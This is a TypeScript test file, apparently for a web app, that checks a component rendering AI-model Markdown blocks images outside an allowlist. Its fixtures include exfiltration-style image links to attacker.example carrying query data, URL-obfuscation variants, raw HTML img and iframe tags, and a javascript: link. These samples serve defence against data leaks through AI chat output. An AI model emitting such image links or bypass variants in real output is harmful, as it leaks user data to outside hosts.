/**
 * 模型输出 Markdown 的统一渲染（服务端静态渲染，无浏览器 / 无 DB）
 * （openspec change ai-markdown-image-allowlist，spec agents/ai-output-rendering）
 * 运行：npx tsx src/components/__tests__/ai-markdown.test.tsx
 */
import assert from "node:assert/strict";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join, relative } from "node:path";
import * as React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { AiMarkdown, type AiMarkdownComponents } from "../ai-markdown";

let passed = 0;
function ok(name: string, cond: boolean, detail?: unknown) {
  assert.equal(cond, true, detail === undefined ? name : `${name}\n${typeof detail === "string" ? detail : JSON.stringify(detail, null, 2)}`);
  passed += 1;
  console.log(`  ✓ ${name}`);
}

const html = (md: string, components?: AiMarkdownComponents) =>
  renderToStaticMarkup(<AiMarkdown components={components}>{md}</AiMarkdown>);
const text = (m: string) => m.replace(/<[^>]+>/g, "").replace(/&quot;/g, '"').replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
/** 任何会让浏览器不经操作就发请求的东西：图片元素、预加载、带 src / srcset 的标签、内联样式里的 url() */
const autoLoads = (m: string) => /<img\b|<link\b|<source\b|<video\b|<audio\b|<iframe\b|<object\b|<embed\b|\ssrc=|\ssrcset=|url\(/i.test(m);
const anchors = (m: string) => [...m.matchAll(/<a\b[^>]*>[\s\S]*?<\/a>/g)].map((x) => x[0]);

console.log("允许清单之外的图片不自动加载");
{
  const m = html("看这张 ![报价](https://attacker.example/p.png?d=SECRET) 图");
  ok("行内外部图片：没有图片元素与预加载", !autoLoads(m), m);
  ok("行内外部图片：没有任何 src 指向外部主机", !/src="[^"]*attacker\.example/.test(m), m);
  ok("行内外部图片：前后的文字照常显示", text(m).includes("看这张") && text(m).includes("图"), m);
}
{
  const m = html("![x][r]\n\n[r]: https://attacker.example/ref.png?d=S");
  ok("引用式写法：没有图片元素", !autoLoads(m), m);
}
for (const [label, md] of [
  ["协议相对地址", "![x](//attacker.example/a.png)"],
  ["http 地址", "![x](http://attacker.example/a.png)"],
  ["反斜杠变形", "![x](/\\\\attacker.example/a.png)"],
  ["尖括号包住的地址", "![x](<https://attacker.example/a b.png>)"],
  ["带标题的图片", '![x](https://attacker.example/a.png "标题")'],
  ["data 地址", "![x](data:image/png;base64,AAAA)"],
  ["站内其它接口", "![x](/api/auth/logout)"],
  ["路径穿越", "![x](/api/files/../auth/logout)"],
  ["指向自己域名的绝对地址", "![x](https://qingyan.example/api/files/a.png)"],
  ["表格单元格里的图片", "| a |\n|---|\n| ![x](https://attacker.example/t.png) |"],
  ["列表里的图片", "- ![x](https://attacker.example/l.png)"],
  ["引用块里的图片", "> ![x](https://attacker.example/q.png)"],
  ["标题里的图片", "## ![x](https://attacker.example/h.png)"],
] as Array<[string, string]>) {
  const m = html(md);
  ok(`不加载：${label}`, !autoLoads(m), m);
}
{
  const m = html("[![看图](https://attacker.example/i.png)](https://attacker.example/l)");
  ok("包在链接里的图片：没有图片元素", !autoLoads(m), m);
  const a = anchors(m);
  ok("包在链接里的图片：链接仍在，里面是文字提示", a.length === 1 && text(a[0]).includes("图片未加载") && text(a[0]).includes("看图"), m);
}
{
  const m = html('<img src="https://attacker.example/raw.png">');
  ok("原始 HTML 图片标签：按文字转义显示", !autoLoads(m.replace(/&lt;[\s\S]*?&gt;/g, "")) && !/<img\b/i.test(m) && m.includes("&lt;img"), m);
  const m2 = html('文字 <img src="https://attacker.example/inline.png" onerror="x"> 文字\n\n<div style="background:url(https://attacker.example/bg.png)">x</div>');
  ok("原始 HTML（行内标签与带样式的块）：不成为标签", !/<img\b|<div\b/i.test(m2), m2);
  const m3 = html('<iframe src="https://attacker.example/f"></iframe>\n\n<link rel="preload" as="image" href="https://attacker.example/p.png">');
  ok("原始 HTML（iframe / link）：不成为标签", !/<iframe\b|<link\b/i.test(m3), m3);
}

console.log("被拦下的图片显示为不可点击的文字提示");
{
  const m = html("![报价](https://attacker.example/p.png?d=SECRET)");
  const t = text(m);
  ok("提示含「图片未加载」、替代文字、主机名", t.includes("图片未加载") && t.includes("报价") && t.includes("attacker.example"), m);
  ok("提示不含地址的路径与查询串", !m.includes("SECRET") && !m.includes("p.png"), m);
  ok("提示不在任何链接或按钮之内", anchors(m).length === 0 && !/<button\b|href=|onclick/i.test(m), m);
  ok("提示的完整文字", t === "〔图片未加载：报价 · attacker.example〕", t);
}
{
  const t = text(html("![](https://attacker.example/p.png)"));
  ok("没有替代文字：不留空冒号或空括号", t === "〔图片未加载 · attacker.example〕", t);
  const t2 = text(html("![退出](/api/auth/logout)"));
  ok("站内其它路径：没有主机名可显示", t2 === "〔图片未加载：退出〕", t2);
}

console.log("站内文件图片照常显示");
{
  const m = html("![效果图](/api/files/ai-chat/org1/a.png)");
  ok("有一个图片元素，src 为站内文件路径", /<img\b[^>]*\ssrc="\/api\/files\/ai-chat\/org1\/a\.png"/.test(m), m);
  ok("alt 为替代文字", /<img\b[^>]*\salt="效果图"/.test(m), m);
  ok("没有指向别处的 src / 预加载", [...m.matchAll(/(?:src|href)="([^"]*)"/g)].every((x) => x[1] === "/api/files/ai-chat/org1/a.png"), m);
  const m2 = html("![a](/api/files/a/../b/c.png?v=2)");
  ok("src 取规范化后的路径 + 查询串", /<img\b[^>]*\ssrc="\/api\/files\/b\/c\.png\?v=2"/.test(m2), m2);
  const m3 = html("![好](/api/files/x/a.png) ![坏](https://attacker.example/b.png)");
  ok("同一段里一张放行一张拦下", (m3.match(/<img\b/g) ?? []).length === 1 && !m3.includes("attacker.example/b.png") && text(m3).includes("〔图片未加载：坏 · attacker.example〕"), m3);
}

console.log("调用方不能把图片与链接规则换掉");
{
  const hostile: AiMarkdownComponents = {
    // 故意写成会直接加载的覆盖项
    // eslint-disable-next-line @next/next/no-img-element, jsx-a11y/alt-text
    img: (props) => <img src={typeof props.src === "string" ? props.src : undefined} data-hostile="1" />,
    a: (props) => <a href={props.href} data-hostile="1">{props.children}</a>,
    p: (props) => <p data-custom="1">{props.children}</p>,
  };
  const m = html("![x](https://attacker.example/p.png) [去](https://attacker.example/l)", hostile);
  ok("调用方的图片覆盖项不生效", !/<img\b/.test(m) && !m.includes("data-hostile"), m);
  ok("调用方的其它覆盖项照常生效", m.includes('data-custom="1"'), m);
  ok("两次用同一份覆盖项渲染结果相同", html("![x](https://attacker.example/p.png)", hostile) === html("![x](https://attacker.example/p.png)", hostile));
}

console.log("外部链接可点击并显示真实去向");
{
  const m = html("[查看报价详情](https://attacker.example/c?d=1)");
  const a = anchors(m);
  ok("文字与去向不一致：href 不变", a.length === 1 && a[0].includes('href="https://attacker.example/c?d=1"'), m);
  ok("文字与去向不一致：新标签页打开", a[0].includes('target="_blank"'), m);
  const rel = /rel="([^"]*)"/.exec(a[0])?.[1] ?? "";
  ok("文字与去向不一致：rel 含 noopener 与 noreferrer", rel.split(" ").includes("noopener") && rel.split(" ").includes("noreferrer"), m);
  ok("文字与去向不一致：链接之后显示主机名", text(m.slice(m.indexOf("</a>"))).includes("attacker.example") && text(m) === "查看报价详情（attacker.example）", text(m));
}
{
  const m = html("见 https://docs.example.org/guide 的说明");
  const a = anchors(m);
  ok("裸地址：成为外部链接并带新标签页与 rel", a.length === 1 && a[0].includes('target="_blank"') && /rel="[^"]*noopener[^"]*noreferrer/.test(a[0]), m);
  ok("裸地址：不重复显示主机名", text(m) === "见 https://docs.example.org/guide 的说明", text(m));
  const m2 = html("[**加粗的** docs.example.org 文档](https://docs.example.org/x)");
  ok("文字里（含嵌套格式）已有主机名：不追加", !m2.includes("link-host"), m2);
  const m3 = html("[x](//attacker.example/c)");
  ok("协议相对链接：按外部处理并显示主机名", anchors(m3)[0]?.includes('target="_blank"') === true && text(m3) === "x（attacker.example）", m3);
}
{
  const m = html("[打开项目](/projects/abc) 和 [小节](#s1)");
  ok("站内链接：没有 target、没有 rel、之后没有主机名", anchors(m).length === 2 && !m.includes("target=") && !m.includes("rel=") && text(m) === "打开项目 和 小节", m);
  const m2 = html("[点我](javascript:alert(1))");
  ok("javascript 链接：href 被渲染库清掉", !/javascript:/i.test(m2), m2);
  const m3 = html("[写信](mailto:someone@example.com)");
  ok("mailto 链接：原样，不当作外部主机", m3.includes('href="mailto:someone@example.com"') && !m3.includes("target="), m3);
}

console.log("其它 Markdown 写法不受影响");
{
  const m = html("## 标题\n\n**加粗** 与 `代码`\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n- [x] 完成\n\n~~删除~~");
  ok("标题 / 加粗 / 代码 / 表格 / 任务列表 / 删除线照常渲染", ["<h2>", "<strong>", "<code>", "<table>", 'type="checkbox"', "<del>"].every((x) => m.includes(x)), m);
}

console.log("规则覆盖全部渲染模型输出的页面");
const ROOT = process.cwd();
const read = (p: string) => readFileSync(join(ROOT, p), "utf8");
const DIRECT_IMPORT = /from\s+["']react-markdown["']|import\s*\(\s*["']react-markdown["']\s*\)|require\(\s*["']react-markdown["']\s*\)/;
const SURFACES = [
  "src/app/(main)/assistant/chat-panel.tsx",
  "src/app/(main)/trade/chat/page.tsx",
  "src/components/market-intelligence/monitoring-workspace.tsx",
  "src/components/market-intelligence/manual-analysis-panel.tsx",
  "src/components/bidtogo/intelligence-card.tsx",
];
for (const p of SURFACES) {
  const src = read(p);
  ok(`${p}：使用统一渲染组件`, /from\s+["']@\/components\/ai-markdown["']/.test(src) && /<AiMarkdown\b/.test(src));
  ok(`${p}：不再直接引入 Markdown 渲染库`, !DIRECT_IMPORT.test(src) && !/<ReactMarkdown\b/.test(src));
}
ok("助手对话仍把自己的渲染覆盖项传给统一组件", /<AiMarkdown\s+components=\{mdComponents\}/.test(read(SURFACES[0])));
{
  const offenders: string[] = [];
  const walk = (dir: string) => {
    for (const name of readdirSync(dir)) {
      if (name === "node_modules" || name === ".next") continue;
      const full = join(dir, name);
      if (statSync(full).isDirectory()) walk(full);
      else if (/\.(ts|tsx|mts|cts|js|jsx|mjs)$/.test(name) && DIRECT_IMPORT.test(readFileSync(full, "utf8"))) offenders.push(relative(ROOT, full));
    }
  };
  walk(join(ROOT, "src"));
  const allowed = ["src/components/ai-markdown.tsx"];
  const extra = offenders.filter((p) => !allowed.includes(p) && p !== "src/components/__tests__/ai-markdown.test.tsx");
  ok("src/ 下直接引入 Markdown 渲染库的文件只有统一组件一个", offenders.includes(allowed[0]) && extra.length === 0, `绕开统一渲染组件的文件（请改用 @/components/ai-markdown）：\n${extra.join("\n")}`);
}
{
  const src = read("src/components/ai-markdown.tsx");
  ok("统一组件不传 urlTransform（保留渲染库默认的地址清洗）", !/urlTransform/.test(src));
  ok("统一组件没有装会渲染原始 HTML 的插件", !/rehype-raw|rehypeRaw|dangerouslySetInnerHTML/.test(src));
}

console.log(`\nai-markdown render: ${passed} passed, 0 failed`);
